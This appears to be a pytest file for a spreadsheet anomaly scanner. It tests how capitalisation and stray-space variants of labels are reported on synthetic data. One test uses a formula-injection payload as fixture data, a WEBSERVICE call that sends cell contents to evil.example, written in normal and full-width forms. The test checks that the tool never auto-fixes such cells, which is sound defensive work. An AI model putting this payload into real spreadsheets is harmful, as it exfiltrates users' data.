"""AH-67: a capital/space variant the source writes many times is its own second spelling, one note for the column; a
slip of a row or three is still flagged on each row. The bar is measured on the round 22, 23, 36, 37, 38 and raw59
sheets: every in-style variant written 4+ times there is the source's (wildlife strikes' ARRIVAL 7 and APPROACH 21,
cocktails' Highball Glass 75 beside 302, a fish survey's Channel catfish 96 beside 658); one written 2-4 times stays a slip to check.
Synthetic sheets only."""
import numpy as np
import pytest

from anomaly_hunter.agents.scan_agent import scan

FLAG = ("Low", "Medium", "High")


def glasses(variant, times, usual=302, seed=67):
    rng = np.random.default_rng(seed)
    labels = ["Highball glass"] * usual + [variant] * times + ["Cocktail glass"] * 450 + ["Old-fashioned glass"] * 213 + ["Shot glass"] * 98
    rng.shuffle(labels)
    return ["Drink", "Glass", "Ingredients"], [[f"Drink {i}", g, int(rng.integers(2, 9))] for i, g in enumerate(labels)]


def test_a_second_spelling_written_a_quarter_as_often_as_the_usual_one_is_one_note():
    # cocktails (round 38): "Highball Glass" 75 beside "Highball glass" 302 stayed a Medium on all 75 rows (0.25 was
    # under AH-64's one-third bar; "Collins glass" 144 beside 269 was one note)
    cols, rows = glasses("Highball Glass", 75)
    out = scan(cols, rows, fair=False)[1]
    said = [(i, o) for i, o in enumerate(out) if "Highball" in o["reason"]]
    assert len(said) == 1, [o["reason"] for _, o in said[:3]]
    i, o = said[0]
    assert '"Highball Glass" 75 times' in o["reason"] and '"Highball glass" 302 times' in o["reason"], o["reason"]
    assert o["severity"] == "Low" and o["cells"] == ["Glass"] and not o.get("likely"), o
    assert [k for k, x in enumerate(out) if x["severity"] in FLAG] == [i]


@pytest.mark.parametrize("times", [5, 7, 21])
def test_an_in_style_variant_written_5_times_or_more_is_the_sources_own_spelling(times):
    # wildlife strikes: ARRIVAL 7 times, APPROACH 21 beside thousands, each a Medium row on main
    cols, rows = glasses("Highball Glass", times, usual=3000)
    out = scan(cols, rows, fair=False)[1]
    said = [o for o in out if "Highball" in o["reason"]]
    assert len(said) == 1 and f'"Highball Glass" {times} times' in said[0]["reason"], [o["reason"] for o in said[:3]]


@pytest.mark.parametrize("times", [1, 2, 3])
def test_a_variant_of_a_row_or_three_is_still_flagged_on_each_of_its_rows(times):
    cols, rows = glasses("Highball Glass", times, usual=300)
    out = scan(cols, rows, fair=False)[1]
    rows_with = [i for i, r in enumerate(rows) if r[1] == "Highball Glass"]
    for i in rows_with:
        assert '"Highball Glass" looks like "Highball glass" (same word, different capitals/spaces)' in out[i]["reason"], out[i]
        assert out[i]["severity"] == "Medium" and out[i]["likely"] == {"Glass": "Highball glass"}, out[i]
    assert [i for i, o in enumerate(out) if o["severity"] in FLAG] == rows_with


def test_a_variant_off_the_columns_style_is_still_flagged_however_common():
    # "employed" 77 beside "Employed" 82 (test_blindspots): lowercase where the labels are capitalised
    cols, rows = glasses("highball glass", 75)
    out = scan(cols, rows, fair=False)[1]
    rows_with = [i for i, r in enumerate(rows) if r[1] == "highball glass"]
    assert all('"highball glass" looks like "Highball glass"' in out[i]["reason"] for i in rows_with)


def flags(name, labels, others, seed=142):
    rng = np.random.default_rng(seed)
    labels = list(labels) + [o for o in others for _ in range(60)]
    rng.shuffle(labels)
    return ["Package", name, "Size"], [[f"pkg{i}", v, int(rng.integers(1, 900))] for i, v in enumerate(labels)]


def test_a_spelling_written_more_often_than_the_one_it_looks_like_is_one_note_never_a_card_a_row():
    # AH-142: CRAN's LazyData "true" 5,156 times beside "TRUE" 790 was 5,156 Medium rows, each a card writing "TRUE"
    # over a correct cell: the majority rewritten to the minority's form
    cols, rows = flags("LazyData", ["true"] * 400 + ["TRUE"] * 60, [])
    out = scan(cols, rows, fair=False)[1]
    said = [o for o in out if "LazyData" in o["reason"]]
    assert len(said) == 1, [o["reason"] for o in said[:3]]
    assert 'LazyData is written "true" 400 times and "TRUE" 60 times' in said[0]["reason"], said[0]["reason"]
    assert said[0]["severity"] == "Low" and not said[0].get("likely") and not said[0].get("exact"), said[0]
    assert not [o for o in out if "LazyData" in o.get("likely", {}) or "LazyData" in o.get("exact", {})]


@pytest.mark.parametrize("times", [5, 240])
def test_a_label_written_with_a_stray_space_5_times_or_more_is_one_note_for_the_column(times):
    # AH-142: Austin's shelter color1 "brown " 2,415 times beside "brown" 4,482 (a split left the space) was 2,415
    # Medium rows; it splits a pivot or a COUNTIF, so it is said once, with both spellings and their counts
    cols, rows = flags("Color", ["brown "] * times + ["brown"] * 450, ["black", "white", "tan"])
    out = scan(cols, rows, fair=False)[1]
    said = [o for o in out if "brown" in o["reason"]]
    assert len(said) == 1, [o["reason"] for o in said[:3]]
    assert f'Color is written "brown " {times} times and "brown" 450 times' in said[0]["reason"], said[0]["reason"]
    assert said[0]["severity"] == "Low" and not said[0].get("likely"), said[0]


def test_a_word_for_no_value_is_never_a_capitals_variant_of_itself():
    # AH-142: "NA" 3,213 times was each a Medium row "looks like na": both say no value, neither is a label to fix
    cols, rows = flags("Breed", ["na"] * 300 + ["NA"] * 40, ["labrador", "beagle", "poodle"])
    out = scan(cols, rows, fair=False)[1]
    assert not [o["reason"] for o in out if "same word" in o["reason"]]


def test_a_spelling_the_column_writes_once_is_said_as_1_time():
    # AH-142: CRAN's LazyLoad "no" 21 times beside "No" once read "1 times" in the note
    cols, rows = flags("LazyLoad", ["no"] * 21 + ["No"], ["Yes", "Unsure"])
    said = [o["reason"] for o in scan(cols, rows, fair=False)[1] if "LazyLoad" in o["reason"]]
    assert any('LazyLoad is written "no" 21 times and "No" 1 time (' in r for r in said), said


@pytest.mark.parametrize("lead", ["＝", "＋", "－", "＠", "=", " ＝"])
def test_a_label_typed_as_a_formula_is_never_given_a_spelling_fix(lead):
    # AH-160: only "=+-@" kept a label out of the spelling check, so 10 "＝WEBSERVICE(...)" and one lowercase got an exact
    # capitals fix, and the pane's auto-fix wrote the full-width formula (Excel reads ＝ as =) with no Accept
    usual, slip = f'{lead}WEBSERVICE("https://evil.example/?"&A2)', f'{lead}webservice("https://evil.example/?"&A2)'
    rows = [[usual, i] for i in range(10)] + [[slip, 10]] + [["Other", 11 + i] for i in range(10)]
    out = scan(["Label", "N"], rows, fair=False)[1]
    assert not any(o.get("exact") or o.get("likely") or o.get("maybe") for o in out), [o for o in out if o.get("reason")]


def test_an_ordinary_label_beside_it_is_still_given_its_capitals_fix():
    rows = [["East", i] for i in range(10)] + [["east", 10]] + [["Other", 11 + i] for i in range(10)]
    out = scan(["Label", "N"], rows, fair=False)[1]
    assert out[10].get("exact") == {"Label": "East"}, out[10]
